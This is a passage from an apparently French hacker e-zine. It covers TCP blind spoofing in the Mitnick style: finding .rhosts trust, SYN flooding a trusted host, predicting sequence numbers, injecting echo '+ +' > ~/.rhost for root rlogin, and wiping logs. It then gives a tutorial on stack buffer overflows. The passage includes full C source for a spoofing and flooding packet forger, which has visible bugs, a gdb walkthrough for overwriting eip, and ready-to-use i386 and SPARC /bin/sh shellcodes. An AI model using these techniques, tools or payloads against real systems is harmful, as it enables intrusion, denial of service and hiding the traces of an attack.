+-nisme d'authentification Kerberos. Pour qu'un client 
+puisse accèder à un serveur sans mot de passe au shell 
+d'un utilisateur d'un serveur, il faut que dans le fichier 
+.rhosts de ce dernier il y'ait le login et le nom de ma-
+-chine du client.
+
+Mettons nous à la place d'un utilisateur quelconque sur 
+un serveur quelconque:
+
+
+utilisateur@serveur:/$ cat ~/.rhosts
+michel     client
+
+
+Si nous nous mettons à la place de "michel" sur la ma-
+-chine client, nous pourrons nous logger sur le shell 
+de l'utilisateur de la machine distante:
+
+michel@client:~$ rlogin -l utilisateur serveur
+Welcome to serveur !
+bash-2.05a$ _
+
+Passons maintenant aux choses sérieuses... En se placant 
+dans la peau d'un pirate sur une machine A voulant accè-
+-der à un shell sur B, nous devrons d'abord déterminer 
+qui fait confiance à B (c'est à dire essayer de "voir" 
+les fichiers .rhosts du serveur). Pour cela nous allons
+faire intervenir un autre protocole, NFS (Network File 
+System). NFS permet justement à une machine d'exporter 
+certains répertoires (mount -t nfs repertoire:machine 
+pour y accèder) et de voir ces repertoires.
+
+Nous utiliserons donc la commande "showmount" pour conn-
+-aître les machines faisant confiance à B:
+
+
+pirate@A:~$ showmount -e B
+export list for B:
+/root   utilisateur@C
+
+
+Ici nous avons une situation particulièrement intéressante,
+bien que peu réaliste, par laquelle nous déduisons que le 
+root de B exporte son repertoire et le rend accessible 
+uniquement pour l'utilisateur de C.
+
+Nous usurperons donc de l'identité de C auprès de B. Comme 
+tout doit vous sembler pour le moment très flou, je vais 
+maintenant m'appliquer à vous expliquer le principe intrin-
+-sèque du Blind Spoofing. Le bagage technique brièvement 
+expliqué jusqu'à présent étant nécessaire à la compréhension 
+de ce qui va suivre, prenez le temps de tout bien relire si 
+toutefois quelques notions venaient à vous échapper. Mais 
+trêve de parole, revenons à nos moutons. 
+
+Le Blind Spoofing va consister très succintement à usurper 
+l'identité d'une machine auprès d'une autre machine faisant 
+confiance à cette première, dans le but d'executer une com-
+-mande sur cette dernière. Cette commande sera le plus sou-
+-vent "echo "+ +" > ~/.rhost, permettant ainsi de laisser 
+n'importe qui accèder au shell de la machine cible. Comme, 
+après m'être relu, je trouve ma phrase totalement incom-
+-préhensible, je vous propose ce schéma:
+
+
+(1) A (IP src=C) ---- SYN ----> B  (la connection s'effectue 
+(2) C <-------- SYN/ACK ------- B   sur le port correspondant 
+(3) A (Ip src=C) ---- ACK ----> B   à rlogin (513))
+(4) A (Ip src=C) ---- PSH ----> B
+
+
+Maintenant, les explications ! Un paquet SYN est d'abord 
+envoyé de A (la machine du pirate) vers B (la machine de 
+la victime). Le champ IP Source Address du paquet SYN con-
+-tient l'adresse IP de la machine C, qui rappellons le, fait 
+confiance ) B. En (2), B renvoie un paquet SYN/ACK à C. Pour 
+éviter que C ne renvoie un paquet RST à B pour lui signaler 
+une erreur dans l'établissement de la connexion, nous de-
+-vrons déconnecter C avant l'étape (2). En (3) il nous reste
+à envoyer un paquet ayant le flag ACK à 1 à B, pour la con-
+-firmation de connexion puis une fois connecté d'envoyer un 
+paquet ayant le flag PSH à 1, afin d'executer la commande 
+énoncée plus haut avec les droits de C (qui est autorisé 
+d'accès à B). Pour que ces dernières étapes soient possi-
+-bles, une nouvelle contradiction s'impose: nous devrons 
+mettre en place une technique de prédiction du numéro de
+séquence initial de B. Une fois ce numéro de séquence de-
+-viné, nous pourrons donc envoyer un segment TCP correct 
+ayant pour numéro de séquence ISN(B)+1 (voir schéma partie 
+1.3). Mais nous reviendrons sur ce "détail" (entre guimets
+car c'est justement la prédiction du numéro de séquence de 
+la cible qui rend la tâche ardue et difficile à mettre en 
+place). 
+
+Pour l'instant attardons nous à déconnecter C. Cette déco-
+-nnection de l'hôte distant est appellée DoS (pour dénis 
+de service). L'attaque DoS que nous utiliserons, afin de 
+rester en parfaite symbiose avec le protocole TCP et ses 
+failles que nous avons étudiéesjusqu'à maintenant (mais éga-
+-lement pour rester en concordance avec la reconsitution du 
+piratage de Tsutomu Shimomura par Kevin Mitnick), sera l'at-
+-taque dite du SYN Flooding.
+
+Le SYN Flooding se base sur l'interrogation suivante: Que se 
+passera t'il si, emporté dans une envolée lyrique soudaine, je 
+décide d'envoyer un paquet SYN avec une adresse IP source 
+inexistante à un hôte ? Il faut savoir qu'entre le moment où 
+l'hôte en question reçoie le SYN et envoie le SYN/ACK, il se 
+place en situation SYN_RECV. Et si il ne peux pas renvoyer ce 
+SYN/ACK vital à la réalisation d'une connection TCP en trois 
+mouvements, il restera bloqué en situation SYN_RECV. De ce 
+fait, si nous inondons l'hôte (sur un quelconque port), de 
+paquets SYN spoofés sur une adresse IP inexistante, la mal-
+-heureuse machine prise pour cible va alors se retrouver en 
+situation de DoS et va misérablement se planter. Par ailleurs, 
+pour éviter que cette situation ne se produise, nous pourrions 
+penser à nous proteger du SYN Flooding en activant le support 
+SYN Cookie du noyau Linux (après avoir recompiler votre noyau 
+faites un "echo 1 > /proc/sys/net/ipv4/tcp_syncookies" - thx 
+to D.J. Bernstein). Mais là n'est pas la question... Le sché-
+-ma qui suit devrait être plus explicite (car il vaut toujours 
+mieux qu'un long discours):
+
+
+root@localhost:~# tcpforger -s 4.4.4.4 -d victime.com -f SYN -p 80 -n
+localhost(4.4.4.4) ---SYN---> victime.com
+localhost(4.4.4.4) ---SYN---> victime.com
+localhost(4.4.4.4) ---SYN---> victime.com
+localhost(4.4.4.4) ---SYN---> victime.com
+localhost(4.4.4.4) ---SYN---> victime.com
+(...)
+
+
+Ainsi on rempli petit à petit le backlog de victim.com avec des 
+connections sans réponses. Finalement le backlog de C saturé, 
+celui ci va finir par ignorer les requètes en sa destination et 
+à se déchirer à essayer de renvoyer des paquets SYN/ACK à une 
+machine inconnue...
+
+Nous pourrions aussi penser, en cas d'échec d'un SYN Flooding, 
+utiliser une autre technique de DoS, telle que le Smurf, le 
+Fraggle, le ping overflood, ou toute autre activité onéreuse 
+et illicite qui plus est, consomme beaucoup de bande passante... 
+Tellement beaucoup qu'il serait plus pratique de lancer notre 
+DoS simultanément à partir de plusieurs machines (dans ce cas 
+on parlera de DDoS - dénis de service distribué), cette pra-
+-tique peu glorieuse a été utilisée par des pirates dernièrement, 
+dans le but avoué de mettre un terme à l'Internet pour quelques 
+minutes en saturant de requètes ICMP les 13 root-servers du ré-
+-seau des réseaux à partir de plusieurs machines ; leur attaque
+n'a d'ailleurs pas abouti, heureusement pour nous et nos quelques 
+minutes de connexion qui auraient pu être supputées à notre fac-
+-ture mensuelle... Bref, je me rend compte que je m'éloigne 
+quelque peu du sujet, alors abrégeons...
+
+Donc une fois l'hôte C déconnecté, la deuxième condition sine 
+qua non à la réussite de notre Blind Spoofing serait de prédire 
+le numéro de séquence initial de B, afin de pouvoir renvoyer en 
+toute impunité nos paquets ACK et PSH forgés sur l'adresse IP 
+source de C. Selon l'article "IP Spoofing demystified" paru 
+dans Phrack (excusez mon ignorance je ne connais plus ni le 
+volume, ni le numéro), l'ISN est incrémenté de 64 000 à cha-
+-que seconde et de 128 000 à chaque connction. Encore fau-
+-drait il le connaitre, cet ISN... Si nous étions en réseau 
+local (LAN), la difficulté ne se poserait pas puisque nous 
+n'aurions qu'à utiliser un de ces bêtes sniffer (tels tcp-
+-dump ou ethereal) pour regarder les paquets passant par 
+notre carte réseau en mode promiscuous, il nous serait alors 
+très facile d'obtenir le numéro de séquence initial de B. 
+Cependant, menée à partir de l'Internet, la prédiction de 
+ce numéro de séquence n'est pas une mince affaire. Les al-
+-gorithmes de génération d'ISN sont établis en fonction de 
+la stack tcp/ip du système d'exploitation, une première 
+approche serait donc d'effectuer une prise d'empreinte (os 
+fingerprint) de l'os distant. Deux choix s'offrent à nous, 
+prise d'empreinte active (nmap -O C), ou passive (en uti-
+-lisant des outils tels que p0f ou syphon). Il est intéres-
+-sant de savoir que la génération des numéros de séquence 
+initals dans la stack tcp/ip des système Windows est bien 
+moins sûre que celle des serveurs de type Unix. Une étude 
+statistique à ce propos à été menée par truff, vous pour-
+-rez retrouver les résultats de ses travaux sur 
+www.projet7.org . L'OS identifié et le niveau de diffi-
+-culté de prédiction de l'ISN déterminé, il nous restera 
+à étudier l'algorithme de genération des ISN du système 
+cible, afin de pouvoir prévoir quel sera cet ISN, que 
+nous incrémenterons lors de l'envoi du ACK (voir 
+connection tcp).
+
+Une fois ces deux conditions accomplie, nous pourrons 
+atteindre notre but, à savoir executer une commande des 
+droits de C sur B à partir de A. Cette commande (echo "+ +" 
+> ~/.rhost pour ceux qui n'auraient pas suivi) permettra à 
+n'importe quel utilisateur d'accèder au shell de root (car 
+root exporte désormais son repertoire à tout le monde). 
+Pour ce faire, après avoir renvoyer un paquet ayant le 
+flag ACK activé à B (et avec les corrects ISN), nous enve-
+-rrons un paquet PSH toujours spoofé sur C (qui est down à 
+présent), le flag PSH servant à pusher des données sur la
+machine distante, ainsi nous pourrons donc executer notre 
+commande.
+
+Ceci étant fait, il ne nous restera plus qu'à nous connecter 
+à B:
+
+pirate@A:~# rlogin -l root B
+Welcome to B !
+sh-2.04$ _
+
+Le système ainsi corrompu, on procédera avant toutes choses 
+à un classique "nettoyage" des fichiers logs, qui se tra-
+-duira le plus souvent par une modification du fichier de 
+configuration du damon syslogd, d'une modification des 
+dates et heures de certains fichiers et de la suppression 
+des historiques et du lastlog. Mais je ne m'étendrais pas 
+plus sur ce sujet, jurez en par Sauron si vous êtes dé-
+-sireux d'effacer vos traces...
+
+Cette technique, le Blind Spoofing, bien que devenue ob-
+-solète par le temps et par la relative difficulté de sa 
+mise en application, a bel et bien fait ses preuves au temps 
+de Mitnick, lorsque celui-ci défiait les experts japonais les 
+plus respectables. Elle montre également des problèmes de sé-
+-curité non-négligeables liés à une mauvaise conception des 
+protocoles sur lesquels Internet repose, je vous ai parlé 
+de TCP dans cet article, le tcp spoofing est une des plus 
+difficiles techniques de spoofing, le plus simple étant 
+le spoofing au niveau de la couche Réseau (ou il suffit 
+juste de modifier le champ Adresse Source des paquets IP 
+à envoyer). L'internet est un gigantesque chateau... 
+mais construit sur du sable.
+
+
+
+/*    TCPforger.c    **
+**  by groslameur    */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <unistd.h>
+
+#define TRUE 0
+#define FALSE -1
+
+
+int fd;
+struct iphdr *ip;
+struct tcphdr *tcp;
+struct sockaddr_in addy;
+struct hostent *source;
+struct hostent *dest;
+
+struct pseudohdr {
+unsigned long saddr;
+unsigned long daddr;
+char useless;
+unsigned char protocol;
+unsigned short length;
+}pseudo;
+
+
+void usage(char programme[])
+{
+printf("usage: %s -s source -d destination [-f] [-p] [-n] [-e]\n", programme);
+printf("-f flag: le flag du paquet TCP à envoyer (SYN/ACK/URG/PSH/RST/FIN)\n");
+printf("-p port: le numéro de port de destination TCP (par défaut 80\n");
+printf("-n nombre de paquets: le nombres de paquets TCP à envoyer\n");
+printf("-e: option qui active l'édition manuelle des paquets TCP\n");
+}
+
+
+unsigned long resolve(char *sname)
+{
+struct hostent * hip;
+hip = gethostbyname(sname);
+
+if (!hip)
+   {
+   fprintf(stderr, "unable to resolve\n");
+   exit(FALSE);
+   }
+
+return *(unsigned long *)hip -> h_addr;
+}
+
+
+unsigned short in_cksum(unsigned short *addr, int len)
+{
+register int sum = 0;
+u_short answer = 0;
+register u_short *w = addr;
+register int nleft = len;
+
+while (nleft > 1)
+   {
+   sum += *w++;
+   nleft -= 2;
+   }	   
+if (nleft == 1)
+   {
+   *(u_char *) (&answer) = *(u_char *) w;
+   sum += answer;
+   }       
+sum = (sum >> 16) + (sum & 0xffff);		
+sum += (sum >> 16);	       
+answer = ~sum;		
+return (answer);
+}
+
+
+int socksend(unsigned long *sssource, unsigned long *dddest, int dport, char *flag, int editsocket, int nbpaquets)
+{
+char *paquet, *fip, *buffer;
+int sihl=0, sversion=4, stos=0, stot_len, sid, sttl=255, sprotocol=6, i;
+int psource, pdest, sres1=0, sfin=0, ssyn=0, srst=0, spsh=0, sack=0, surg=0, swin=0, surg_ptr=0;
+long sseq, sack_seq;
+packet=(char *) malloc(sizeof(struct iphdr) + sizeof(struct tcphdr));
+buffer=(char *) malloc(sizeof(struct iphdr) + sizeof(struct tcphdr));
+ip=(struct iphdr *) packet;
+tcp=(struct tcphdr *) (packet + sizeof(struct iphdr));
+
+if(flag)
+   {
+   if(!strcmp(flag, "SYN")) ssyn=1;
+   if(!strcmp(flag, "ACK")) sack=1;
+   if(!strcmp(flag, "RST")) srst=1;
+   if(!strcmp(flag, "FIN")) sfin=1;
+   if(!strcmp(flag, "PSH")) spsh=1;
+   if(!strcmp(flag, "URG")) surg=1;
+   else fprintf(stderr, "flag non valide\n");
+   }
+
+if(editsocket==1)
+{
+printf("IP ILH(5):\n");
+scanf("%d", &sihl);
+printf("IP VERSION(4):\n");
+scanf("%d", &sversion);
+printf("IP TOS(0):\n");
+scanf("%d", &stos);
+printf("IP TTL(255):\n");
+scanf("%d", &sttl);
+printf("TCP PORT SOURCE:\n");
+scanf("%d", &psource);
+printf("TCP PORT DEST:\n");
+scanf("%d", &pdest);
+printf("TCP SEQ:\n");
+scanf("%d", &sseq);
+printf("TCP ACK_SEQ:\n");
+scanf("%d", &sack_seq);	 
+printf("TCP SYN FLAG:\n");
+scanf("%d", &ssyn);
+printf("TCP FIN FLAG:\n");
+scanf("%d", &sfin);
+printf("TCP RES1 FLAG:\n");
+scanf("%d", &sres1);
+printf("TCP RST FLAG:\n");
+scanf("%d", &srst);	 
+printf("TCP PSH FLAG:\n");
+scanf("%d", &spsh);
+printf("TCP ACK FLAG:\n");
+scanf("%d", &sack);
+printf("TCP URG FLAG:\n");
+scanf("%d", &surg);
+printf("TCP WINDOW :\n");
+scanf("%d", &swin);	 
+printf("TCP POINTEUR URGENT:\n");
+scanf("%d", &surg_ptr);	 
+}
+
+ip->ihl=sihl;
+ip->version=sversion;
+ip->tos=stos;
+ip->tot_len=sizeof(struct iphdr) + sizeof(struct tcphdr);
+ip->id=(random());
+ip->ttl=sttl;
+ip->protocol=IPPROTO_TCP;
+ip->saddr=ssource;
+ip->daddr=ddest;
+
+pseudo.saddr=ip->saddr;
+pseudo.daddr=ip->daddr;
+pseudo.useless=htons(0);
+pseudo.protocol=IPPROTO_TCP;
+pseudo.length=sizeof(struct tcphdr);
+
+tcp->source=htons(psource);
+tcp->dest=htons(pdest);
+tcp->seq=htonl(sseq);
+tcp->ack_seq=htonl(sack_seq);
+tcp->doff=sizeof(tcp)/4;
+tcp->res1=sres1;
+tcp->fin=sfin;
+tcp->syn=ssyn;
+tcp->rst=srst;
+tcp->psh=spsh;
+tcp->ack=sack;
+tcp->urg=surg;
+tcp->window=htons(swin);
+tcp->urg_ptr=htons(surg_ptr);
+tcp->check=in_cksum((unsigned short *)&pseudo,sizeof(struct tcphdr) + sizeof(struct pseudohdr));
+ip->check=in_cksum((unsigned short *)ip, sizeof(struct iphdr));
+
+fd=socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+if(fd<0) { fprintf(stderr, "unable to create socket\n");
+           exit(FALSE);
+         }
+
+addy.sin_family=AF_INET;
+addy.sin_port=tcp->dest;
+addy.sin_addr.s_addr=ip->daddr;
+
+for(i=0;i<=nbpaquets;++i)
+{
+if((sendto(fd,packet,ip->tot_len,0,(struct sockaddr *)&addy, sizeof(struct sockaddr)))<0)
+   fprintf(stderr, "unable to send\n");
+  
+else printf("A(%s) ---- %s ----> B(%s)\n", ssource, flag, ddest);
+	    
+}
+
+close(fd);
+exit(TRUE);
+}
+
+
+int main(int argc, char *argv[])
+{
+char *source, *dest;
+char *flag="SYN", c;
+unsigned long ssource, ddest;
+int dport=80, editsock=1, nbpaquets=1;
+
+if(argc<2)
+{
+printf("usage: %s -s source -d destination -f flag -p port -n nombre de paquets [-e]\n", argv[0]);
+exit(FALSE);
+}
+
+while ((c = getopt (argc, argv, "hs:d:f:p:n:e:")) != -1)
+   switch (c)
+       {
+       case 'h':
+       usage(argv[0]);
+       exit(TRUE);
+       break;
+       case 's':
+       source=optarg;
+       ssource=resolve(source);
+       break;
+       case 'd':
+       dest=optarg;
+       ddest=resolve(dest);
+       break; 
+       case 'f':
+       flag=optarg;
+       break;
+       case 'p':
+       dport=atoi(optarg);
+       break;
+       case 'n':
+       nbpaquets=atoi(optarg);
+       break;
+       case 'e':
+       editsock=1;
+       break;
+       case '?':
+       fprintf(stderr, "%s: option non valide\n", optopt);
+       exit(FALSE);
+       break;
+       };
+
+socksend(ssource, ddest, dport, flag, editsock, nbpaquets);
+exit(TRUE);
+} 
+
+
+
+[-EOF]
+
+
+
+
+
+
+
+
+
+
+---------------------------------------------------------------
+IV.: HOW TO WRITE A BUFFER OVERFLOW            Par groslameur
+---------------------------------------------------------------
+
+
+[ Introduction ]
+
+Le buffer overlow est sans doute la faille la plus appréciée 
+de nos jours, son exploitation fait la joie de certains script 
+kiddies, qui malheuresement compilent et executent leur exploit 
+sans aucune idée de "comment a t-il été codé". Ce document au-
+-ra donc comme dure tache de vous introduire (car c'est plus 
+une introduction qu'autre chose) à l'écriture de ce type de pro-
+-grammes. Vous verrez, ce n'est pas aussi compliqué que ça en a 
+l'air, toutefois, si vous désirez aller plus loin, je vous con-
+-seille de consulter l'article de Aleph1 paru dans Phrack49 et 
+intitulé "Smashing the stack for fun and profit". Je ne vous 
+demande rien d'autre qu'un peu d'attention et quelques bonnes 
+bases en c/asm. Vous pouvez toutefois essayer de suivre sans. 
+
+
+[ Presentation de l'exploit ]
+
+Nous allons donc apprendre à coder le plus bel exploit de 
+l'homme, j'ai nommé le buffer overflow. En résumé, un buffer 
+overflow, ou débordement de tampon, se produit à partir du mo-
+-ment ou l'on cherche à entrer plus de données qu'il n'est per-
+-mis dans un espace de mémoire, le buffer (tampon). L'exploi-
+-tation de ce type d'erreurs va donc se faire en essayant de 
+détourner le fonctionnement d'un programme vulnérable, par le 
+biais de fonctions sensibles comme on le verra tout à l'heure 
+afin de lui faire executer un code de notre choix.
+
+Au plan de vue technique, le registre %eip est overwrité, et 
+au moment de retourner, le programme peut executer un code 
+hostile, le shellcode. L'écriture d'un exploit pour ce type 
+de vulnérabilité nécessite déjà de bonnes connaissances en 
+c et en asm 32b. Déjà, petite mise au point: La stack, ou
+pile, est un bloc de mémoire contenant des données, composée 
+si on veux de "tiroirs" que l'on pousse quand on apelle une 
+fonction, et que l'on tire quand on la retourne. Ces tirois 
+s'apellent les stack frames, et ils contiennent les paramètres 
+des fonctions, les variables qu'elle englobe. Comme un petit 
+schéma vaut mieux qu'un long discours, je vous propose pour 
+illustrer mes propos ce dessin, présentant les différentes 
+régions de la mémoire d'un processus :
+
+
+              /------------------\  Adresse mémoire
+              |                  |  la plus basse
+              |       Texte      |
+              |                  |
+              |------------------|
+              |  (Initialisées)  |
+              |     Données      |
+              (non initialisées) |
+              |------------------|
+              |                  |
+              |       Stack      |  Adresse mémoire
+              |                  |  la plus haute
+              \------------------/
+
+
+Ci dessus, la stack, dont on vient de parler un peu plus haut, 
+ainsi que les données, contenant les variables utilisées par 
+le programme, et tout en haut la zone texte, sur laquelle on 
+ne peut pas écrire, et qui contient le programme en lui même,
+et tous les éléments qui le composent.
+
+Intéressons nous maintenant aux différents registres asm 32b 
+permettant de manipuler ces régions mémoire :
+- %eax : Le registre accumulateur, qui, comme ax dans les 
+registres 16b, peut servir un peu à tout, nottament aux 
+calculs mathématiques.
+- %ebx : Le registre de base, lors de l'appel d'une fonction 
+système, on doit lui passer le premier paramètre de cette 
+fonction.
+- %ecx : Le second registre de base, auquel on passe notre 
+second paramètre.
+- %edx : Le troisième registre de base, pour le troisième 
+paramètre.
+- %eip : Ce registre pointe vers la prochaine instruction à 
+executer, nous allons souvent y revenir lors de l'écriture 
+d'un buffer overflow.
+- %esp : C'est le registre qui pointe tout en haut de la pile.
+- %ebp : C'est le registre qui pointe au début de la zone de 
+la pile servant à la fonction courante. On l'utilisera pour 
+accèder aux variables locales.
+
+Il existe d'autres registres 32b, mais nous nous interesserons 
+qu'a ceux ci pour le moment. Les buffer overflow sont en fait 
+propres à un programme sensible, et plus particulièrement aux 
+fonctions du langage C sensibles, telles que strcpy(), strcat(), 
+etc.. qui ne controlent pas les quantités de mémoires restantes 
+avant de copier le contenu d'une variable dans un espace mémoire.
+
+Nous apprendrons donc au fil de cet article à coder un exploit 
+approprié à une de ces fonctions faillibles. Pour le moment 
+revenons à nos moutons...
+
+Et considérons l'appel de fonction suivant :
+------------------------------------------------------------------
+void function(int a, int b, int c) { (..) }
+
+main()
+{
+function(1,2,3);
+}
+------------------------------------------------------------------
+Si nous déssasemblons la fonction main, nous obtiendrons ceci :
+------------------------------------------------------------------
+pushl $3
+pushl $2
+pushl $1
+call function
+------------------------------------------------------------------
+L'instruction push place les arguments 3, 2 et 1 en haut de la pile, 
+puis l'instruction call empile le registre %eip. Plus techniquement, 
+lors de l'appel d'une fonction en C, le processeur sauvegarde les 
+variables déclarées ou servant d'arguments à une fonction dans la 
+pile, ainsi que le contenu du registre %eip, qui rapellons le, 
+pointe vers la prochaine instruction à executer. Et c'est là 
+qu'est tout l'art d'un débordement de tampon, overwriter l'image 
+du registre %eip sauvegardée dans la stack, afin de pouvoir exe-
+-cuter l'instruction de son choix, à savoir le fameux shellcode 
+(oeuf), dont le but sera le plus souvent de vous donner un shell.
+
+Pour être plus clair dans mes explications, voici un petit dessin
+représentant la pile d'un programme vulnérable:
+
+[buffer,n][%ebp=Base Pointer][%eip=Instruction Pointer]
+
+Pour exploiter ce programme, nous devrons avoir la possibilité
+d'écrire autant de caractères que l'on désire dans le buffer. Si 
+vous avez bien suivi vous savez que cela est possible quand le 
+programme utilise des fonctions qui ne surveillent pas la taille 
+d'une chaine a copier dans un buffer par rapport à la taille de 
+ce dernier (par exemple strcpy(buffer, argv[1]). Nous pourrons 
+donc spécifier comme argument au programme une chaine de taille 
+n+OFFSET, OFFSET représentant un déplacement en octet nécessaire 
+pour accèder à %eip. Donc, une fois le contrôle sur %eip, libre
+à nous de modifier l'adresse de retour de notre fonction, que
+nous ferons pointer vers un shellcode ;)
+
+
+[ Rassemblement des paramètres ]
+
+Résumons... L'écriture d'un buffer overflow nécessite donc 
+deux paramètres indispensables, que sont ceux ci :
+1) La position de l'image du %eip sauvegardé dans la stack.
+2) L'adresse du buffer à overwrité, chose évidente.
+
+Maintenant, la question qui tue : Comment connaître et rassem-
+-bler ces deux paramètres afin d'écrire notre exploit ? La 
+réponse est simple, et tient en trois lettres : gdb, un désa-
+-ssembleur surpuissant intégré aux distributions linux. Donc, 
+une fois toutes les clés en main, il ne vous reste plus qu'à
+suivre ce que je vous propose de lire...
+
+Nous allons prendre comme exemple le programme suivant :
+------------------------------------------------------------------
+/* vul.c */
+#include <stdio.h>
+#include <string.h>
+int main(int argc, char *argv[])
+{
+char buffer[128];
+strcpy(buffer, argv[1]);
+}
+------------------------------------------------------------------
+
+Après la compilation (gcc vul.c -o vul), on va tenter d'executer 
+le programme en lui passant une longue chaîne de caractères :
+------------------------------------------------------------------
+[root@localhost] $ ./vul
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentatation fault
+------------------------------------------------------------------
+
+Le programme segfault, ce qui confirme bien qu'il est sensible 
+à un buffer overflow. On va donc chercher pour commencer l'a-
+-dresse du buffer à overwriter, à savoir buffer[128], pour cela 
+on sort donc gdb :
+------------------------------------------------------------------
+[root@localhost] $ gdb vul
+(gdb) disas main  (désassemblage de la fonction main)
+Dump of assembler code for function main:
+0x8048490 <main>:       pushl   %ebp  (sauvegarde de %ebp)
+0x8048491 <main+1>:     movl    %esp,%ebp (prélude)
+0x8048493 <main+3>:     subl    $0x80,%esp
+0x8048499 <main+9>:     movl    0xc(%ebp),%eax
+0x804849c <main+12>:    addl    $0x4,%eax
+0x804849f <main+15>:    movl    (%eax),%edx
+0x80484a1 <main+17>:    pushl   %edx
+0x80484a2 <main+18>:    leal    0xffffff80(%ebp),%eax
+0x80484a5 <main+21>:    pushl   %eax
+0x80484a6 <main+22>:    call    0x80483bc <strcpy>
+0x80484ab <main+27>:    addl    $0x8,%esp
+0x80484ae <main+30>:    movl    %ebp,%esp
+0x80484b0 <main+32>:    popl    %ebp  (récupération de %ebp)
+0x80484b1 <main+33>     ret
+End of assembler dump.
+------------------------------------------------------------------
+
+Premier objectif : Trouver l'adresse du buffer. On observe avant 
+l'appel de la fonction strcpy() une empilation du registre %eax 
+à l'adresse 0x80484a5, buffer étant le premier argument de strcpy(), 
+il sera donc placé logiquement dans le registre %eax. On va donc 
+tenter de récupérer l'adresse de buffer, en posant un breakpoint 
+à l'adresse 0x80484a5.
+------------------------------------------------------------------
+(gdb) break *0x80484a5  (pose du breakpoint)
+Breakpoint 1 at 0x80484a5
+(gdb) run  (execution du programme)
+Starting program: /root/vul
+(no debugging symbol found)...(no debugging symbol found)...
+Breakpoint 1, 0x80484a5 in main ()
+(gdb) info registers  (on demande maintenant des infos sur les registres)
+     eax: 0xbffffd68 - 1073742488
+(pas la peine d'aller plus loin, seul eax nous interesse)
+------------------------------------------------------------------
+
+On récupère donc l'adresse du buffer, 0xbffffd68. La moitié du 
+chemin est (presque) faite. Reste à trouver l'adresse de %eip 
+avant l'appel de main(). Toujours avec gdb, on va overwriter 
+%eip et tenter d'obtenir la distance (offset) entre le début 
+du buffer et la position de %eip.
+------------------------------------------------------------------
+(gdb) run `perl -e "printf('A'x132)";echo BBBB`
+(ou 132 = 128 + 4, BBBB est donc une chaine de 4 caractères, 
+le but étant d'overwriter avec précision le registre %eip)
+Starting program: /root/vul 'perl -e "printf('A'x132)";echo BBBB'
+Program receive signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(0x42 est égal à B, donc c'est bon)
+(gdb) info registers  (vérifions les registres)
+(...)
+eip: 0x42424242 1111638594
+(...)
+(bingo! le registre %eip contient 0x42424242, c'est à dire BBBB)
+------------------------------------------------------------------
+Cette phase est assez difficile à comprendre, mais avec un 
+peu de logique, on parvient facilement à ses fins. Nous sa-
+-vons donc maintenant qu'en utilisant un offset de 132 par 
+rapport à l'adresse du buffer, BBBB, autrement dit 0x42424242, 
+overwrite bien %eip. Dans notre exploit, pour écraser l'adresse
+de retour de strcpy (afin qu'elle pointe vers le shellcode), 
+nous utiliserons donc une chaine telle que 'chaine[OFFSET+4]', 
+ou OFFSET=132 et 4 correspond à la chaîne de 4 caractères 
+permettant l'overwrite (dans notre exemple BBBB). Nous avons 
+donc toutes les clés en main ! Sauf... L'oeuf, le shellcode 
+qui sera censé nous donner un shell root ! Ok, let's go !
+
+
+[ Ecriture du shellcode ]
+
+Cette phase n'est en réalité pas vraiment nécessaire car on
+peut facilement trouver des shellcodes sur internet correspon-
+-dant à des architectures différentes. Cependant on va tout de 
+même étudier dans ce chapitre le processus de création d'un oeuf.
+
+Le principe en lui même est en réalité extrémement simple. On 
+code d'abord le programme en c capable de nous donner le shell 
+root, puis on le désassemble avec gdb (disas main). Après quoi 
+on regarde les instructions asm correspondantes, et on cherche 
+les opcodes en utilisant la commande sous gdb "x", et on les 
+note. On assemble ensuite tous nos opcodes pour fabriquer un
+shellcode du style \x90\.../bin/sh. La coutume veut en effet 
+que l'on place une quantité de x90 avant le shellcode propre-
+-ment dit, correspondant à l'instruction nop (no operation) 
+afin que, si au moment de retourner, l'exploit fait un bond 
+au milieu du shellcode et qu'il tombe sur un x90, le code qui 
+suit sera tout de même executer. Cela dit la copie des nops 
+dans le shellcode se fera par l'exploit lui-même.
+
+A noter également qu'un shellcode ne peut contenir d'octets 
+nuls, x00. Plutôt que de vous montrer étape par étape comment 
+créer un shellcode, je 
+vous propose plutôt ces différents shellcodes, pré-écrits, 
+tirés de phrack. Bonne lecture ;)
+
+i386/Linux -
+        jmp    0x1f
+        popl   %esi
+        movl   %esi,0x8(%esi)
+        xorl   %eax,%eax
+	  movb   %eax,0x7(%esi)
+        movl   %eax,0xc(%esi)
+        movb   $0xb,%al
+        movl   %esi,%ebx
+        leal   0x8(%esi),%ecx
+        leal   0xc(%esi),%edx
+        int    $0x80
+        xorl   %ebx,%ebx
+        movl   %ebx,%eax
+        inc    %eax
+        int    $0x80
+        call   -0x24
+        .string \"/bin/sh\"
+
+Shellcode correspondant :
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+
+SPARC/Solaris  -
+        sethi   0xbd89a, %l6
+        or      %l6, 0x16e, %l6
+        sethi   0xbdcda, %l7
+        and     %sp, %sp, %o0
+        add     %sp, 8, %o1
+        xor     %o2, %o2, %o2
+        add     %sp, 16, %sp
+        std     %l6, [%sp - 16]
+        st      %sp, [%sp - 8]
+        st      %g0, [%sp - 4]
+        mov     0x3b, %g1
+        ta      8
+        xor     %o7, %o7, %o0
+        mov     1, %g1
+        ta      8
+
+Shellcode correspondant :
+  "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"
+  "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
+  "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08"
+  "\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd0\x20\x08";
